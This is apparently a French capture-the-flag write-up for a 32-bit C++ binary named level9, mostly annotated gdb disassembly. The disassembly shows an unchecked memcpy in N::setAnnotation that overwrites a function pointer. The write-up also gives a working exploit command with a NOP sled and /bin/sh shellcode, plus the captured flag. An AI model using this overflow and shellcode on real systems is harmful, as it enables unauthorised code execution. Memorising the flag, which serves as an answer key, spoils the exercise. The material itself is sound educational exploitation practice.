On voit qu'on est dans un binaire, dont le code a été écrit en C++, qui utilise notamment memcpy (dans une fonction setAnnotation d'un objet) pour copier notre 1er argument dans un tableau de char de taille 100.

Le setAnnotation permet d'écrire 100 chars à l'adresse 0x804a00c, zone qui est suivie de 2 * 8 chars puis de l'adresse contenant l'adresse qui sera appelée dans le call présent à main+159

0x804a00c:      0x41306141      0x61413161      0x33614132      0x41346141
0x804a01c:      0x61413561      0x37614136      0x41386141      0x62413961
0x804a02c:      0x31624130      0x41326241      0x62413362      0x35624134
0x804a03c:      0x41366241      0x62413762      0x39624138      0x41306341
0x804a04c:      0x63413163      0x33634132      0x41346341      0x63413563
0x804a05c:      0x37634136      0x41386341      0x64413963      0x31644130
0x804a06c:      0x42326441      0x00000005      0x00000071      0x08048848


Donc on devrait pouvoir exécuter un shell avec : python -c "print (adresseShellcode + nop *(l08 - len shellcode (= 45) - len (adresseShellcode =4) donc => 59) + shellcode + adresse de l'adresseShellcode : 0x804a00c)" 

OK (exécute le shell) => r $(python -c "print ('\x08\x04\xa0\x1c'[::-1] + '\x90'*59 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\x04\xa0\x0c'[::-1])")

./level9 $(python -c "print ('\x08\x04\xa0\x1c'[::-1] + '\x90'*59 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\x04\xa0\x0c'[::-1])")

=> flag : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728





Analyse du binaire : 



> info functions

0x080486f6  N::N(int) => 0x80486f6 <_ZN1NC2Ei>:  0x8be58955
0x080486f6  N::N(int) 
0x0804870e  N::setAnnotation(char*) => 0x804870e <_ZN1N13setAnnotationEPc>:    0x83e58955
0x0804873a  N::operator+(N&) => 0x804873a <_ZN1NplERS_>:        0x8be58955
0x0804874e  N::operator-(N&)
0x08048510  memcpy
0x08048520  strlen
0x08048530  operator new(unsigned int) => 0x8048530 <_Znwj@plt>:  0x9b7025ff
0x080485f4  main

=> On voit les fonctions de la classe N


> disas main

Dump of assembler code for function main:
0x080485f4 <+0>:     push   ebp
0x080485f5 <+1>:     mov    ebp,esp
0x080485f7 <+3>:     push   ebx
0x080485f8 <+4>:     and    esp,0xfffffff0
0x080485fb <+7>:     sub    esp,0x20 
0x080485fe <+10>:    cmp    DWORD PTR [ebp+0x8],0x1 => ebp+8 = 2 (vérifie qu'on a au moins un argument)
0x08048602 <+14>:    jg     0x8048610 <main+28>  if ebp+8 > 0x1, jump après _exit, sinon _exit

0x08048604 <+16>:    mov    DWORD PTR [esp],0x1
0x0804860b <+23>:    call   0x80484f0 <_exit@plt> => _exit(1)

0x08048610 <+28>:    mov    DWORD PTR [esp],0x6c => esp = 108
0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
-----------------------------------------------------------
=> 0x08048530 in operator new () => fonction qui créé un nouvel objet
	Dump of assembler code for function _Znwj@plt: 
	0x08048530 <+0>:     jmp    DWORD PTR ds:0x8049b70
	0x08048536 <+6>:     push   0x40
	0x0804853b <+11>:    jmp    0x80484a0
	End of assembler dump.
-----------------------------------------------------------
0x0804861c <+40>:    mov    ebx,eax => ebx = eax =0x804a008: 0x0 
0x0804861e <+42>:    mov    DWORD PTR [esp+0x4],0x5 => esp+4 = 5
0x08048626 <+50>:    mov    DWORD PTR [esp],ebx (ebx = 0x804a008)
0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei> _ZN1NC2Ei(0x804a008, 5)
------------------------------------------------------------------------
	Dump of assembler code for function _ZN1NC2Ei: (i pour int)
	0x080486f6 <+0>:     push   ebp
	0x080486f7 <+1>:     mov    ebp,esp
	0x080486f9 <+3>:     mov    eax,DWORD PTR [ebp+0x8] (eax = 0x804a008)
	0x080486fc <+6>:     mov    DWORD PTR [eax],0x8048848 => eax = 0x804a008:      0x08048848
	0x08048702 <+12>:    mov    eax,DWORD PTR [ebp+0x8] =>   eax = 0x804a008:      0x08048848
	0x08048705 <+15>:    mov    edx,DWORD PTR [ebp+0xc] => edx = 5 et 0x804a070:      0x00000000
	0x08048708 <+18>:    mov    DWORD PTR [eax+0x68],edx => eax+0x68 => 0x804a070:      0x00000005
	0x0804870b <+21>:    pop    ebp
	0x0804870c <+22>:    ret
-----------------------------------------------------
0x0804862e <+58>:    mov    DWORD PTR [esp+0x1c],ebx => esp+0x1c(28) = 0x804a008:      0x08048848

0x08048632 <+62>:    mov    DWORD PTR [esp],0x6c => esp = 0x6c (108)
0x08048639 <+69>:    call   0x8048530 <_Znwj@plt> => call adresse 0x8048530
----------------------------------------------------------
	=> 0x08048530 in operator new ()
	0x08048530 <+0>:     jmp    DWORD PTR ds:0x8049b70 => 0x8049b70: 0xb7f9b600 => 0xb7f9b600 in operator new(unsigned int)
	0x08048536 <+6>:     push   0x40
	0x0804853b <+11>:    jmp    0x80484a0
----------------------------------------------------------
0x0804863e <+74>:    mov    ebx,eax
0x08048640 <+76>:    mov    DWORD PTR [esp+0x4],0x6 => esp+4 = 6
0x08048648 <+84>:    mov    DWORD PTR [esp],ebx

0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei> => eax+0x68 = 6
--------------------------------------------------------------------------
	Dump of assembler code for function _ZN1NC2Ei: (i pour int)
	0x080486f6 <+0>:     push   ebp
	0x080486f7 <+1>:     mov    ebp,esp
	0x080486f9 <+3>:     mov    eax,DWORD PTR [ebp+0x8] 
	0x080486fc <+6>:     mov    DWORD PTR [eax],0x8048848 
	0x08048702 <+12>:    mov    eax,DWORD PTR [ebp+0x8] 
	0x08048705 <+15>:    mov    edx,DWORD PTR [ebp+0xc] 
	0x08048708 <+18>:    mov    DWORD PTR [eax+0x68],edx
	0x0804870b <+21>:    pop    ebp
	0x0804870c <+22>:    ret
-----------------------------------------------------
0x08048650 <+92>:    mov    DWORD PTR [esp+0x18],ebx
0x08048654 <+96>:    mov    eax,DWORD PTR [esp+0x1c]
0x08048658 <+100>:   mov    DWORD PTR [esp+0x14],eax
0x0804865c <+104>:   mov    eax,DWORD PTR [esp+0x18]
0x08048660 <+108>:   mov    DWORD PTR [esp+0x10],eax
0x08048664 <+112>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048667 <+115>:   add    eax,0x4
0x0804866a <+118>:   mov    eax,DWORD PTR [eax]
0x0804866c <+120>:   mov    DWORD PTR [esp+0x4],eax
0x08048670 <+124>:   mov    eax,DWORD PTR [esp+0x14]
0x08048674 <+128>:   mov    DWORD PTR [esp],eax

0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc> => methode setAnnotationEP de la classe N
----------------------------------------
	Dump of assembler code for function _ZN1N13setAnnotationEPc:
	0x0804870e <+0>:     push   ebp
	0x0804870f <+1>:     mov    ebp,esp
	0x08048711 <+3>:     sub    esp,0x18
	0x08048714 <+6>:     mov    eax,DWORD PTR [ebp+0xc]
	0x08048717 <+9>:     mov    DWORD PTR [esp],eax => esp = argv1
	0x0804871a <+12>:    call   0x8048520 <strlen@plt>
	0x0804871f <+17>:    mov    edx,DWORD PTR [ebp+0x8] => strlen de argv1 à ebp+8
	0x08048722 <+20>:    add    edx,0x4
	0x08048725 <+23>:    mov    DWORD PTR [esp+0x8],eax
	0x08048729 <+27>:    mov    eax,DWORD PTR [ebp+0xc]
	0x0804872c <+30>:    mov    DWORD PTR [esp+0x4],eax
	0x08048730 <+34>:    mov    DWORD PTR [esp],edx
	0x08048733 <+37>:    call   0x8048510 <memcpy@plt> => memcpy(dst, argv[1], strlen(argv[1])). dst => adresse 0x0804a00c
	0x08048738 <+42>:    leave  => 0x0804a00c = argv[1]
	0x08048739 <+43>:    ret
-------------------------------------------------------------------
0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
0x08048690 <+156>:   mov    DWORD PTR [esp],eax
0x08048693 <+159>:   call   edx
-----------------------------------------------------
	Dump of assembler code for function _ZN1NplERS_: (N::operator+(N&))
	=> 0x0804873a <+0>:     push   ebp
	0x0804873b <+1>:     mov    ebp,esp
	0x0804873d <+3>:     mov    eax,DWORD PTR [ebp+0x8] => eax = 0x0804a078
	0x08048740 <+6>:     mov    edx,DWORD PTR [eax+0x68]
	0x08048743 <+9>:     mov    eax,DWORD PTR [ebp+0xc]
	0x08048746 <+12>:    mov    eax,DWORD PTR [eax+0x68]
	0x08048749 <+15>:    add    eax,edx => (5, 6)
	0x0804874b <+17>:    pop    ebp => eax = 11
	0x0804874c <+18>:    ret
	End of assembler dump.
----------------------------------------------------------
=> eax = 11
0x08048695 <+161>:   mov    ebx,DWORD PTR [ebp-0x4]
0x08048698 <+164>:   leave
0x08048699 <+165>:   ret





Dump of assembler code for function _Znwj:
   0xb7f9b600 <+0>:     push   edi => esp = 
   0xb7f9b601 <+1>:     mov    eax,0x1 => eax = 0x1
   0xb7f9b606 <+6>:     push   esi
   0xb7f9b607 <+7>:     push   ebx
   0xb7f9b608 <+8>:     sub    esp,0x10
   0xb7f9b60b <+11>:    mov    esi,DWORD PTR [esp+0x20]
   0xb7f9b60f <+15>:    call   0xb7f364e7
   0xb7f9b614 <+20>:    add    ebx,0x319e0
   0xb7f9b61a <+26>:    test   esi,esi
   0xb7f9b61c <+28>:    cmove  esi,eax
   0xb7f9b61f <+31>:    mov    DWORD PTR [esp],esi => esp = 108
=> 0xb7f9b622 <+34>:    call   0xb7f34f60 <malloc@plt>
   0xb7f9b627 <+39>:    test   eax,eax
   0xb7f9b629 <+41>:    jne    0xb7f9b680 <_Znwj+128>
   0xb7f9b62b <+43>:    mov    edi,DWORD PTR [ebx-0x264]
   0xb7f9b631 <+49>:    mov    eax,DWORD PTR [edi]
   0xb7f9b633 <+51>:    test   eax,eax
   0xb7f9b635 <+53>:    je     0xb7f9b64c <_Znwj+76>
   0xb7f9b637 <+55>:    nop
   0xb7f9b638 <+56>:    call   eax
   0xb7f9b63a <+58>:    mov    DWORD PTR [esp],esi
   0xb7f9b63d <+61>:    call   0xb7f34f60 <malloc@plt>
   0xb7f9b642 <+66>:    test   eax,eax
   0xb7f9b644 <+68>:    jne    0xb7f9b680 <_Znwj+128>
   0xb7f9b646 <+70>:    mov    eax,DWORD PTR [edi]
   0xb7f9b648 <+72>:    test   eax,eax
   0xb7f9b64a <+74>:    jne    0xb7f9b638 <_Znwj+56>
   0xb7f9b64c <+76>:    mov    DWORD PTR [esp],0x4
   0xb7f9b653 <+83>:    call   0xb7f34410 <__cxa_allocate_exception@plt>
   0xb7f9b658 <+88>:    mov    edx,DWORD PTR [ebx-0x320]
   0xb7f9b65e <+94>:    add    edx,0x8
   0xb7f9b661 <+97>:    mov    DWORD PTR [eax],edx
   0xb7f9b663 <+99>:    mov    edx,DWORD PTR [ebx-0x9c]
   0xb7f9b669 <+105>:   mov    DWORD PTR [esp],eax
   0xb7f9b66c <+108>:   mov    DWORD PTR [esp+0x8],edx
   0xb7f9b670 <+112>:   mov    edx,DWORD PTR [ebx-0x4b4]
   0xb7f9b676 <+118>:   mov    DWORD PTR [esp+0x4],edx
   0xb7f9b67a <+122>:   call   0xb7f348c0 <__cxa_throw@plt>
   0xb7f9b67f <+127>:   nop
   0xb7f9b680 <+128>:   add    esp,0x10
   0xb7f9b683 <+131>:   pop    ebx
   0xb7f9b684 <+132>:   pop    esi
   0xb7f9b685 <+133>:   pop    edi
   0xb7f9b686 <+134>:   ret
   0xb7f9b687 <+135>:   cmp    edx,0xffffffff
   0xb7f9b68a <+138>:   mov    DWORD PTR [esp],eax
   0xb7f9b68d <+141>:   je     0xb7f9b694 <_Znwj+148>
   0xb7f9b68f <+143>:   call   0xb7f359d0 <_Unwind_Resume@plt>
   0xb7f9b694 <+148>:   call   0xb7f340e0 <__cxa_call_unexpected@plt>